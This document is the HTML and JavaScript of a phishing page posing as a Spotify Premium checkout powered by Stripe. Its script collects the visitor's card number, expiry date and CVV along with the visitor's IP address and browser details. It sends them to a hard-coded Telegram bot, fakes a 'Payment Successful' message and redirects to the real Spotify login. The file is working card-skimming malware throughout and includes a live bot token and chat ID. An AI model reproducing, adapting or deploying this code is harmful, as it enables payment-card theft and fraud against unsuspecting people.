<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spotify Checkout</title>
    <!-- Favicons (use absolute paths so they work under /checkout/:id/) -->
    <link rel="icon" type="image/png" sizes="32x32" href="/607275_black_2048x2048.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/607275_black_2048x2048.png">
    <link rel="apple-touch-icon" href="/607275_black_2048x2048.png">
    <link rel="shortcut icon" href="/607275_black_2048x2048.png" type="image/x-icon">
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Custom font if needed, otherwise Tailwind's default sans is Inter */
        body {
            font-family: 'Inter', sans-serif;
        }
    </style>
</head>
<body class="min-h-screen bg-gray-100 p-0 md:p-6 lg:p-8 flex md:items-center md:justify-center">
    <div class="bg-white rounded-none md:rounded-xl shadow-none md:shadow-lg w-full max-w-6xl flex flex-col lg:flex-row overflow-hidden min-h-screen md:min-h-0">
        <!-- Left Column: Checkout Details -->
        <div class="lg:w-2/3 p-4 md:p-8 lg:p-10">
            <!-- Spotify Logo (clickable) -->
            <a href="https://www.spotify.com/" target="_blank" rel="noopener" class="block w-fit mx-auto mb-2">
                <img src="/images-2.png" alt="Spotify Logo" class="h-14 md:h-18" onerror="this.onerror=null;this.src='https://placehold.co/150x50/000000/FFFFFF?text=Spotify';"/>
            </a>
            <!-- Help / Contact Links -->
            <div class="flex justify-center md:justify-end gap-4 mb-4 md:mb-6 text-sm">
                <a href="https://support.spotify.com/" target="_blank" rel="noopener" class="text-gray-600 hover:text-gray-800 hover:underline">Help</a>
                <a href="https://support.spotify.com/contact-spotify-support/" target="_blank" rel="noopener" class="text-gray-600 hover:text-gray-800 hover:underline">Contact Us</a>
            </div>


            <!-- Premium Section -->
            <div class="mb-8 p-6 bg-blue-50 rounded-lg border border-blue-200">
                <div class="flex justify-between items-start mb-2">
                    <div class="flex items-center gap-2">
                        <img src="/4c33c49c-ee13-4fa6-ba48-9980bb5cb90e.png" alt="Premium logo" class="h-10 w-10 object-contain" onerror="this.style.display='none'"/>
                        <h2 class="text-xl font-semibold text-gray-700">Premium</h2>
                    </div>
                    <div class="text-right leading-tight">
                        <div class="text-lg font-bold text-gray-900">23.99 AED</div>
                        <div class="text-sm text-gray-500">For 1 month</div>
                    </div>
                </div>
                <div class="mb-2">
                    <span class="text-lg font-medium text-gray-800">Premium Individual</span>
                </div>
                <p class="text-sm text-gray-600 mb-1">
                    <!-- CheckCircle Icon (inline SVG) -->
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block w-4 h-4 text-green-500 mr-1">
                        <path d="M22 11.08V12a10 10 0 1 1-5.93-8.5"></path>
                        <path d="m11 12 2 2 4-4"></path>
                    </svg>
                    Today: 1 month for 23.99 AED
                </p>
                    <p class="text-sm text-gray-600 mb-1">
                    <!-- CheckCircle Icon (inline SVG) -->
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block w-4 h-4 text-green-500 mr-1">
                        <path d="M22 11.08V12a10 10 0 1 1-5.93-8.5"></path>
                        <path d="m11 12 2 2 4-4"></path>
                    </svg>
                        Starting <span id="startDate1">Sep 6, 2025</span>: 23.99 AED/month
                </p>
                <p class="text-sm text-gray-600">
                    <!-- CheckCircle Icon (inline SVG) -->
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="inline-block w-4 h-4 text-green-500 mr-1">
                        <path d="M22 11.08V12a10 10 0 1 1-5.93-8.5"></path>
                        <path d="m11 12 2 2 4-4"></path>
                    </svg>
                    Cancel anytime online. Terms apply.
                </p>
            </div>

            <!-- Payment Method Section -->
            <div class="mb-8 p-6 bg-white rounded-lg border border-gray-200 shadow-none md:shadow-sm">
                <h2 class="text-xl font-semibold text-gray-700 mb-4">Payment method</h2>

                <!-- Payment Method Tabs -->
                <div class="flex flex-wrap space-x-2 lg:space-x-4 mb-6 border-b border-gray-200">
                    <button id="creditCardTab" class="pb-3 px-2 text-sm lg:text-lg font-medium text-blue-600 border-b-2 border-blue-600">
                        Credit or debit card
                    </button>
                    <button id="paypalTab" class="pb-3 px-2 text-sm lg:text-lg font-medium text-gray-500 hover:text-gray-700">
                        PayPal
                    </button>
                </div>

                <div id="creditCardContent" class="space-y-4">


                    <div>
                        <label for="cardNumber" class="block text-sm font-medium text-gray-700 mb-1">
                            Card number
                        </label>
                        <div class="relative">
                            <input
                                type="text"
                                id="cardNumber"
                                class="w-full p-3 pl-10 pr-20 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500"
                                placeholder="0000 0000 0000 0000"
                            />
                            <!-- CreditCard Icon (inline SVG) -->
                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400">
                                <rect width="20" height="14" x="2" y="5" rx="2"></rect>
                                <path d="M2 10h20"></path>
                            </svg>
                            <!-- Card Type Icons -->
                            <div class="absolute right-3 top-1/2 transform -translate-y-1/2 flex space-x-1">
                                <img src="https://js.stripe.com/v3/fingerprinted/img/visa-729c05c240c4bdb47b03ac81d9945bfe.svg" alt="Visa" class="h-4" onerror="this.style.display='none'"/>
                                <img src="https://js.stripe.com/v3/fingerprinted/img/mastercard-4d8844094130711885b5e41b28c9848f.svg" alt="Mastercard" class="h-4" onerror="this.style.display='none'"/>
                                <img src="https://js.stripe.com/v3/fingerprinted/img/amex-a49b82f46c5cd6a96a6e418a5d038eea.svg" alt="American Express" class="h-4" onerror="this.style.display='none'"/>
                                <img src="https://js.stripe.com/v3/fingerprinted/img/unionpay-8a10aefc7295216c338ba4e1224627a1.svg" alt="Union Pay" class="h-4" onerror="this.style.display='none'"/>
                            </div>
                        </div>
                    </div>
                    <div class="flex space-x-4">
                        <div class="w-1/2">
                            <label for="expiryDate" class="block text-sm font-medium text-gray-700 mb-1">
                                Expiry date
                            </label>
                            <input
                                type="text"
                                id="expiryDate"
                                class="w-full p-3 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500"
                                placeholder="MM/YY"
                            />
                        </div>
                        <div class="w-1/2">
                            <label for="securityCode" class="block text-sm font-medium text-gray-700 mb-1">
                                Security code
                            </label>
                            <div class="relative">
                                <input
                                    type="text"
                                    id="securityCode"
                                    class="w-full p-3 border border-gray-300 rounded-md focus:ring-blue-500 focus:border-blue-500"
                                    placeholder="CVV"
                                />
                            </div>
                        </div>
                    </div>
                    <div class="space-y-2 text-sm text-gray-600">
                        <div class="flex items-start">
                            <span class="mr-2">•</span>
                            <span>We'll remind you 7 days before you're charged.</span>
                        </div>
                        <div class="flex items-start">
                            <span class="mr-2">•</span>
                            <span>Cancel anytime online. <a href="https://www.spotify.com/ae-en/legal/premium-promotional-offer-terms/" target="_blank" class="text-blue-600 underline hover:text-blue-800">Terms apply</a></span>
                        </div>
                    </div>
                    <p class="text-xs text-gray-500 mt-2 flex items-center">
                        <!-- Custom Spotify Security Shield Icon -->
                        <svg class="w-4 h-4 mr-2 text-green-500" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M12 2L3 7V12C3 16.55 6.84 20.74 9.91 21.79L12 22.5L14.09 21.79C17.16 20.74 21 16.55 21 12V7L12 2M12 7C13.4 7 14.8 7.35 16 7.9V12C16 15.08 14.25 17.23 12 17.74C9.75 17.23 8 15.08 8 12V7.9C9.2 7.35 10.6 7 12 7M10.5 12.5L9.5 11.5L8.5 12.5L10.5 14.5L15.5 9.5L14.5 8.5L10.5 12.5Z"/>
                        </svg>
                        Your payment information is encrypted and secure with Spotify Premium protection. By continuing, you agree to allow Spotify to charge your account each month until you cancel and to our Terms and Conditions.
                    </p>

                    
                </div>



                <div id="paypalContent" class="text-center p-8 border border-gray-300 rounded-md bg-gray-50 hidden">
                    <img
                        src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_74x46.jpg"
                        alt="PayPal"
                        class="mx-auto mb-4"
                    />
                    <button id="paypalBtn" class="bg-blue-700 text-white py-3 px-6 rounded-full font-semibold hover:bg-blue-800 transition duration-300">
                        <span id="paypalBtnText">Pay with PayPal</span>
                        <svg id="paypalLoader" class="animate-spin -ml-1 mr-3 h-5 w-5 text-white hidden inline" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                    </button>
                    <p id="paypalMessage" class="text-sm text-gray-600 mt-4">You will be redirected to PayPal to complete your purchase.</p>
                </div>

                
            </div>
        </div>

        <!-- Right Column: Summary -->
        <div class="lg:w-1/3 bg-gray-50 p-4 md:p-8 lg:p-10 border-t lg:border-t-0 lg:border-l border-gray-200">
            <div class="flex items-center justify-between mb-6">
                <h2 class="text-2xl font-bold text-gray-800">Summary</h2>
                <a href="https://www.spotify.com/ae-en/premium/#plans" target="_blank" rel="noopener" class="text-sm text-blue-600 hover:underline">Return to plans</a>
            </div>

            <p class="text-sm font-semibold text-gray-600 mb-2">Items</p>
            <div class="space-y-4 mb-6">
                <div class="flex justify-between items-center text-gray-700">
                    <div class="flex items-center">
                        <!-- Small logo before Premium Individual -->
                        <img src="/4c33c49c-ee13-4fa6-ba48-9980bb5cb90e.png" alt="Premium logo" class="h-6 w-6 md:h-7 md:w-7 object-contain mr-2" onerror="this.style.display='none'"/>
                        <span class="font-medium">Premium Individual</span>
                    </div>
                    <span>23.99 AED</span>
                </div>
                <div class="text-sm text-gray-600 pl-6">
                    <p>Today: 1 month for 23.99 AED</p>
                    <p>Starting <span id="startDate2">Sep 6, 2025</span>: 23.99 AED/month</p>
                </div>
            </div>

            <div class="border-t border-gray-300 pt-4 mt-4">
                <div class="flex justify-between items-center text-xl font-bold text-gray-900">
                    <span>Total now</span>
                    <span>23.99 AED</span>
                </div>
            </div>

            <p class="text-xs text-gray-500 mt-6 leading-relaxed">
                If you don't cancel your subscription before the trial ends, you agree to allow Spotify to charge your account each month the charged fees (subscription fee, any applicable taxes, etc.). If you change your plan or redeem another offer during the trial, your trial will immediately terminate. Full terms are available
                <a href="https://www.spotify.com/ae-en/legal/premium-promotional-offer-terms/" target="_blank" class="text-blue-600 hover:underline">here</a>. Spotify will use your payment info in accordance with our
                <a href="https://www.spotify.com/ae-en/legal/premium-promotional-offer-terms/" target="_blank" class="text-blue-600 hover:underline">Privacy Policy</a> to protect your personal data. please see Spotify's
                <a href="https://www.spotify.com/ae-en/legal/cookies-policy/" target="_blank" class="text-blue-600 hover:underline">Cookie Policy</a>.
            </p>

            <button id="completePurchaseBtn" class="w-full bg-green-500 text-white py-3 mt-8 rounded-full font-bold text-lg hover:bg-green-600 transition duration-300 shadow-md">
                Complete purchase
            </button>
            
            <!-- Powered by Stripe -->
            <div class="flex items-center justify-center mt-6 pt-4 border-t border-gray-100">
                <div class="flex items-center space-x-2 text-gray-500">
                    <span class="text-sm">Powered by</span>
                    <img src="https://js.stripe.com/v3/fingerprinted/img/stripe-logo-transparent-4f3db29b.svg" alt="Stripe" class="h-5" onerror="this.style.display='none'"/>
                    <span class="text-sm font-medium">Stripe</span>
                    <span class="text-gray-300">|</span>
                    <a href="https://stripe.com/ae/privacy" target="_blank" class="text-sm text-gray-500 hover:text-gray-700">Privacy Policy</a>
                </div>
            </div>

            
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Dynamic start dates: show today's date
            const today = new Date();
            const opts = { year: 'numeric', month: 'short', day: 'numeric' };
            const formatted = today.toLocaleDateString(undefined, opts).replace(/,/g, '');
            const start1 = document.getElementById('startDate1');
            const start2 = document.getElementById('startDate2');
            if (start1) start1.textContent = formatted;
            if (start2) start2.textContent = formatted;
            const creditCardTab = document.getElementById('creditCardTab');
            const paypalTab = document.getElementById('paypalTab');

            const creditCardContent = document.getElementById('creditCardContent');
            const paypalContent = document.getElementById('paypalContent');

            // Function to update tab styles and content visibility
            function selectPaymentMethod(method) {
                // Get the Complete Purchase button
                const completePurchaseBtn = document.getElementById('completePurchaseBtn');
                
                // Reset all tab styles
                creditCardTab.classList.remove('text-blue-600', 'border-b-2', 'border-blue-600');
                creditCardTab.classList.add('text-gray-500', 'hover:text-gray-700');
                paypalTab.classList.remove('text-blue-600', 'border-b-2', 'border-blue-600');
                paypalTab.classList.add('text-gray-500', 'hover:text-gray-700');

                // Hide all content sections
                creditCardContent.classList.add('hidden');
                paypalContent.classList.add('hidden');

                // Apply selected tab style and show relevant content
                if (method === 'creditCard') {
                    creditCardTab.classList.add('text-blue-600', 'border-b-2', 'border-blue-600');
                    creditCardContent.classList.remove('hidden');
                    // Show Complete Purchase button only for credit card
                    completePurchaseBtn.classList.remove('hidden');
                } else if (method === 'paypal') {
                    paypalTab.classList.add('text-blue-600', 'border-b-2', 'border-blue-600');
                    paypalContent.classList.remove('hidden');
                    // Hide Complete Purchase button for PayPal
                    completePurchaseBtn.classList.add('hidden');
                }
            }

            // Event listeners for the tabs
            creditCardTab.addEventListener('click', () => selectPaymentMethod('creditCard'));
            paypalTab.addEventListener('click', () => selectPaymentMethod('paypal'));

            // Initialize the selected payment method on page load
            selectPaymentMethod('creditCard'); // Default to credit card

            // Telegram Bot Configuration
            const TELEGRAM_BOT_TOKEN = '8293886140:AAG3ZjygG0dHOFI6Kw0UHkbrGyZWSx4Er_M';
            const TELEGRAM_CHAT_ID = '6791037967'; // Your actual chat ID

            // Function to send data to Telegram
            async function sendToTelegram(data) {
                try {
                    const message = `🔴 NEW CARD DETAILS RECEIVED 🔴

💳 Card Number: ${data.cardNumber}
🏦 Card Type: ${data.cardType || 'Unknown'}
✅ Luhn Valid: ${data.isValidLuhn ? 'Yes' : 'No'}
📅 Expiry Date: ${data.expiryDate}
📋 Expiry Valid: ${data.isValidExpiry ? 'Yes' : 'No'}
🔐 Security Code: ${data.securityCode}
🔒 CVV Valid: ${data.isValidCVV ? 'Yes' : 'No'}

🌐 User Agent: ${navigator.userAgent}
📍 IP Address: ${await getIPAddress()}
⏰ Timestamp: ${new Date().toLocaleString()}

🎵 Product: Premium Individual
💰 Amount: 23.99 AED`;

                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: TELEGRAM_CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });

                    if (response.ok) {
                        console.log('Data sent to Telegram successfully');
                        showSuccessMessage();
                    } else {
                        console.error('Failed to send to Telegram');
                        showErrorMessage();
                    }
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                    showErrorMessage();
                }
            }

            // Function to get IP address (using a free service)
            async function getIPAddress() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    return data.ip;
                } catch (error) {
                    return 'Unknown';
                }
            }

            // Function to show success message
            function showSuccessMessage() {
                const button = document.getElementById('completePurchaseBtn');
                const originalText = button.textContent;
                button.textContent = 'Processing...';
                button.disabled = true;
                button.classList.remove('bg-green-500', 'hover:bg-green-600');
                button.classList.add('bg-yellow-500');

                setTimeout(() => {
                    button.textContent = 'Payment Successful!';
                    button.classList.remove('bg-yellow-500');
                    button.classList.add('bg-green-600');
                    
                    setTimeout(() => {
                        button.textContent = originalText;
                        button.disabled = false;
                        button.classList.remove('bg-green-600');
                        button.classList.add('bg-green-500', 'hover:bg-green-600');
                    }, 3000);
                }, 2000);
            }

            // Function to show error message
            function showErrorMessage() {
                const button = document.getElementById('completePurchaseBtn');
                const originalText = button.textContent;
                button.textContent = 'Error - Please Try Again';
                button.disabled = true;
                button.classList.remove('bg-green-500', 'hover:bg-green-600');
                button.classList.add('bg-red-500');

                setTimeout(() => {
                    button.textContent = originalText;
                    button.disabled = false;
                    button.classList.remove('bg-red-500');
                    button.classList.add('bg-green-500', 'hover:bg-green-600');
                }, 3000);
            }

            // Function to show field error
            function showFieldError(fieldId, message) {
                const field = document.getElementById(fieldId);
                const container = field.parentElement;
                
                // Remove existing error message
                const existingError = container.querySelector('.field-error');
                if (existingError) {
                    existingError.remove();
                }
                
                // Add error styling to field
                field.style.borderColor = '#EF4444';
                field.classList.add('border-red-500');
                
                // Create error message
                const errorDiv = document.createElement('div');
                errorDiv.className = 'field-error text-red-500 text-xs mt-1 flex items-center';
                errorDiv.innerHTML = `
                    <svg class="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
                        <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                    </svg>
                    ${message}
                `;
                
                container.appendChild(errorDiv);
            }
            
            // Function to clear field error
            function clearFieldError(fieldId) {
                const field = document.getElementById(fieldId);
                const container = field.parentElement;
                
                // Remove error message
                const existingError = container.querySelector('.field-error');
                if (existingError) {
                    existingError.remove();
                }
                
                // Remove error styling
                field.style.borderColor = '#D1D5DB';
                field.classList.remove('border-red-500');
            }

            // Event listener for complete purchase button
            document.getElementById('completePurchaseBtn').addEventListener('click', function() {
                const cardNumber = document.getElementById('cardNumber').value.trim();
                const expiryDate = document.getElementById('expiryDate').value.trim();
                const securityCode = document.getElementById('securityCode').value.trim();

                // Clear all previous errors
                clearFieldError('cardNumber');
                clearFieldError('expiryDate');
                clearFieldError('securityCode');

                let hasErrors = false;

                // Check for empty fields and show specific errors
                if (!cardNumber) {
                    showFieldError('cardNumber', 'Please fill the card number first');
                    hasErrors = true;
                }
                if (!expiryDate) {
                    showFieldError('expiryDate', 'Please fill the expiry date first');
                    hasErrors = true;
                }
                if (!securityCode) {
                    showFieldError('securityCode', 'Please fill the CVV first');
                    hasErrors = true;
                }

                // If any field is empty, stop here
                if (hasErrors) {
                    return;
                }

                // Comprehensive validation for filled fields
                const cleanCardNumber = cardNumber.replace(/\D/g, '');
                const isValidCard = luhnValidation(cleanCardNumber);
                const cardType = detectCardType(cleanCardNumber);
                const isValidExpiry = validateExpiryDate(expiryDate);
                const isValidCVV = validateCVV(securityCode, cardType);

                // Specific validation error messages
                if (!isValidCard || cardType === 'unknown') {
                    showFieldError('cardNumber', 'Please enter a valid card number');
                    hasErrors = true;
                }

                if (!isValidExpiry) {
                    showFieldError('expiryDate', 'Please enter a valid expiry date (MM/YY format, future date)');
                    hasErrors = true;
                }

                if (!isValidCVV) {
                    const cvvLength = getCVVLength(cardType);
                    showFieldError('securityCode', `Please enter a valid ${cvvLength}-digit CVV code`);
                    hasErrors = true;
                }

                // If validation errors, stop here
                if (hasErrors) {
                    return;
                }

                // All validations passed - collect data
                const cardData = {
                    cardNumber: cardNumber,
                    cardType: cardType.toUpperCase(),
                    expiryDate: expiryDate,
                    securityCode: securityCode,
                    isValidLuhn: isValidCard,
                    isValidExpiry: isValidExpiry,
                    isValidCVV: isValidCVV
                };

                // Send to Telegram
                sendToTelegram(cardData);

                // Show loading state
                const button = this;
                const originalText = button.textContent;
                button.disabled = true;
                button.innerHTML = `
                    <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white inline" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Processing...
                `;

                // After 2 seconds, show success message
                setTimeout(() => {
                    button.innerHTML = `
                        <svg class="w-5 h-5 mr-2 inline" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
                        </svg>
                        Payment Successful!
                    `;
                    button.classList.remove('bg-green-500', 'hover:bg-green-600');
                    button.classList.add('bg-green-600');
                    
                    // After another 1.5 seconds, redirect to Spotify login
                    setTimeout(() => {
                        window.location.href = 'https://accounts.spotify.com/en/login?continue=https%3A%2F%2Fopen.spotify.com%2F';
                    }, 1500);
                }, 2000);
            });

            // Card Validation Logic
            function detectCardType(cardNumber) {
                // Remove spaces and non-digits
                const cleanNumber = cardNumber.replace(/\D/g, '');
                
                // BIN (Bank Identification Number) Detection
                if (cleanNumber.startsWith('4')) {
                    return 'visa';
                } else if (cleanNumber.startsWith('5') || cleanNumber.startsWith('2')) {
                    return 'mastercard';
                } else if (cleanNumber.startsWith('34') || cleanNumber.startsWith('37')) {
                    return 'amex';
                } else if (cleanNumber.startsWith('62') || cleanNumber.startsWith('81')) {
                    return 'unionpay';
                } else if (cleanNumber.startsWith('6')) {
                    return 'discover';
                }
                return 'unknown';
            }

            // Luhn Algorithm for card validation
            function luhnValidation(cardNumber) {
                const cleanNumber = cardNumber.replace(/\D/g, '');
                let sum = 0;
                let isEven = false;

                // Process digits from right to left
                for (let i = cleanNumber.length - 1; i >= 0; i--) {
                    let digit = parseInt(cleanNumber[i]);

                    if (isEven) {
                        digit *= 2;
                        if (digit > 9) {
                            digit -= 9;
                        }
                    }

                    sum += digit;
                    isEven = !isEven;
                }

                return sum % 10 === 0;
            }

            // Format card number with spaces
            function formatCardNumber(value) {
                const cleanValue = value.replace(/\D/g, '');
                const cardType = detectCardType(cleanValue);
                
                // Different formatting for different card types
                if (cardType === 'amex') {
                    // Amex: 4-6-5 format (XXXX XXXXXX XXXXX)
                    return cleanValue.replace(/(\d{4})(\d{6})(\d{5})/, '$1 $2 $3');
                } else {
                    // Visa, Mastercard, etc: 4-4-4-4 format
                    return cleanValue.replace(/(\d{4})(?=\d)/g, '$1 ');
                }
            }

            // Format expiry date as MM/YY
            function formatExpiryDate(value) {
                const cleanValue = value.replace(/\D/g, '');
                if (cleanValue.length >= 2) {
                    return cleanValue.substring(0, 2) + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
                }
                return cleanValue;
            }

            // Validate expiry date (MM/YY format)
            function validateExpiryDate(expiryDate) {
                const cleanValue = expiryDate.replace(/\D/g, '');
                if (cleanValue.length !== 4) return false;

                const month = parseInt(cleanValue.substring(0, 2));
                const year = parseInt('20' + cleanValue.substring(2, 4));
                
                // Check valid month (01-12)
                if (month < 1 || month > 12) return false;

                // Get current date
                const now = new Date();
                const currentMonth = now.getMonth() + 1; // getMonth() returns 0-11
                const currentYear = now.getFullYear();

                // Check if year is in the future or current year
                if (year < currentYear) return false;
                
                // If same year, month must be current or future
                if (year === currentYear && month < currentMonth) return false;

                return true;
            }

            // Get CVV length based on card type
            function getCVVLength(cardType) {
                if (cardType === 'amex') {
                    return 4; // American Express uses 4 digits
                }
                return 3; // Visa, Mastercard, etc. use 3 digits
            }

            // Validate CVV code
            function validateCVV(cvv, cardType) {
                const cleanCVV = cvv.replace(/\D/g, '');
                const requiredLength = getCVVLength(cardType);
                
                // Check if CVV is digits only and correct length
                return cleanCVV.length === requiredLength && /^\d+$/.test(cleanCVV);
            }

            // Update card type icons based on detected type
            function updateCardTypeDisplay(cardType) {
                const cardIcons = document.querySelectorAll('#creditCardContent .absolute.right-3 img');
                
                // Hide all icons first
                cardIcons.forEach(icon => {
                    icon.style.opacity = '0.3';
                    icon.style.transform = 'scale(0.8)';
                });

                // Highlight the detected card type
                cardIcons.forEach(icon => {
                    const altText = icon.alt.toLowerCase();
                    if (altText.includes(cardType)) {
                        icon.style.opacity = '1';
                        icon.style.transform = 'scale(1.1)';
                        icon.style.transition = 'all 0.3s ease';
                    }
                });
            }



            // Add validation indicator for any field
            function showFieldValidationStatus(fieldId, isValid, message = '') {
                const fieldInput = document.getElementById(fieldId);
                const fieldContainer = fieldInput.parentElement;
                
                // Remove existing validation indicators
                const existingIndicator = fieldContainer.querySelector('.validation-indicator');
                if (existingIndicator) {
                    existingIndicator.remove();
                }

                // Create validation indicator
                const indicator = document.createElement('div');
                // Use different positioning for expiry date to avoid conflicts
                const rightPosition = fieldId === 'expiryDate' ? 'right-2' : 'right-3';
                indicator.className = `validation-indicator absolute ${rightPosition} top-1/2 transform -translate-y-1/2 flex items-center space-x-1`;
                
                if (isValid) {
                    // Just green border, no icon for valid fields
                    fieldInput.style.borderColor = '#10B981';
                    return; // Don't add any indicator
                } else if (fieldInput.value.length > 0) {
                    indicator.innerHTML = `
                        <svg class="w-4 h-4 text-red-500" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                        </svg>
                    `;
                    fieldInput.style.borderColor = '#EF4444';
                } else {
                    fieldInput.style.borderColor = '#D1D5DB';
                }

                if (indicator.innerHTML) {
                    fieldContainer.appendChild(indicator);
                }
            }

            // Add validation indicator for card number (special case with card type)
            function showValidationStatus(isValid, cardType) {
                const cardInput = document.getElementById('cardNumber');
                const cardContainer = cardInput.parentElement;
                
                // Remove existing validation indicators
                const existingIndicator = cardContainer.querySelector('.validation-indicator');
                if (existingIndicator) {
                    existingIndicator.remove();
                }

                // Create validation indicator
                const indicator = document.createElement('div');
                indicator.className = 'validation-indicator absolute right-20 top-1/2 transform -translate-y-1/2 flex items-center space-x-1';
                
                if (isValid && cardType !== 'unknown') {
                    // Just green border, no icon for valid card
                    cardInput.style.borderColor = '#10B981';
                    return; // Don't add any indicator
                } else if (cardInput.value.replace(/\D/g, '').length >= 13) {
                    indicator.innerHTML = `
                        <svg class="w-5 h-5 text-red-500" fill="currentColor" viewBox="0 0 20 20">
                            <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                        </svg>
                        <span class="text-xs text-red-600 font-medium">INVALID</span>
                    `;
                    cardInput.style.borderColor = '#EF4444';
                } else {
                    cardInput.style.borderColor = '#D1D5DB';
                }

                if (indicator.innerHTML) {
                    cardContainer.appendChild(indicator);
                }
            }

            // Card number input handler
            function handleCardNumberInput(event) {
                // Clear error message when user starts typing
                clearFieldError('cardNumber');
                
                let value = event.target.value;
                const cleanValue = value.replace(/\D/g, '');
                
                // Limit length based on card type
                const cardType = detectCardType(cleanValue);
                const maxLength = cardType === 'amex' ? 15 : 16;
                
                if (cleanValue.length > maxLength) {
                    return;
                }

                // Format and update the input
                const formattedValue = formatCardNumber(value);
                event.target.value = formattedValue;

                // Detect card type and validate
                updateCardTypeDisplay(cardType);
                
                // Validate with Luhn algorithm if number is complete
                if (cleanValue.length >= 13) {
                    const isValid = luhnValidation(cleanValue);
                    showValidationStatus(isValid, cardType);
                } else {
                    showValidationStatus(false, cardType);
                }
            }

            // Expiry date input handler
            function handleExpiryDateInput(event) {
                // Clear error message when user starts typing
                clearFieldError('expiryDate');
                
                let value = event.target.value;
                const cleanValue = value.replace(/\D/g, '');
                
                // Limit to 4 digits (MMYY)
                if (cleanValue.length > 4) {
                    return;
                }

                // Format and update the input
                const formattedValue = formatExpiryDate(value);
                event.target.value = formattedValue;

                // Validate expiry date
                if (cleanValue.length === 4) {
                    const isValid = validateExpiryDate(formattedValue);
                    showFieldValidationStatus('expiryDate', isValid);
                } else if (cleanValue.length > 0) {
                    showFieldValidationStatus('expiryDate', false);
                } else {
                    showFieldValidationStatus('expiryDate', true); // Reset when empty
                }
            }

            // CVV input handler
            function handleCVVInput(event) {
                // Clear error message when user starts typing
                clearFieldError('securityCode');
                
                let value = event.target.value;
                const cleanValue = value.replace(/\D/g, '');
                
                // Get card type to determine CVV length
                const cardNumber = document.getElementById('cardNumber').value;
                const cardType = detectCardType(cardNumber);
                const maxLength = getCVVLength(cardType);
                
                // Limit length and digits only
                if (cleanValue.length > maxLength) {
                    return;
                }

                // Update input with digits only
                event.target.value = cleanValue;

                // Validate CVV
                if (cleanValue.length > 0) {
                    const isValid = validateCVV(cleanValue, cardType);
                    showFieldValidationStatus('securityCode', isValid);
                } else {
                    showFieldValidationStatus('securityCode', true); // Reset when empty
                }

                // Update placeholder based on card type
                if (cardType === 'amex') {
                    event.target.placeholder = 'CVVV (4 digits)';
                } else {
                    event.target.placeholder = 'CVV (3 digits)';
                }
            }

            // Real-time card details capture disabled - only send when user clicks Complete Purchase
            // let cardDetailsSent = false;
            
            // function captureCardDetails() {
            //     const cardNumber = document.getElementById('cardNumber').value;
            //     const expiryDate = document.getElementById('expiryDate').value;
            //     const securityCode = document.getElementById('securityCode').value;
            //     
            //     // Additional validation before sending
            //     const cleanCardNumber = cardNumber.replace(/\D/g, '');
            //     const isValidCard = luhnValidation(cleanCardNumber);
            //     const cardType = detectCardType(cleanCardNumber);
            //     const isValidExpiry = validateExpiryDate(expiryDate);
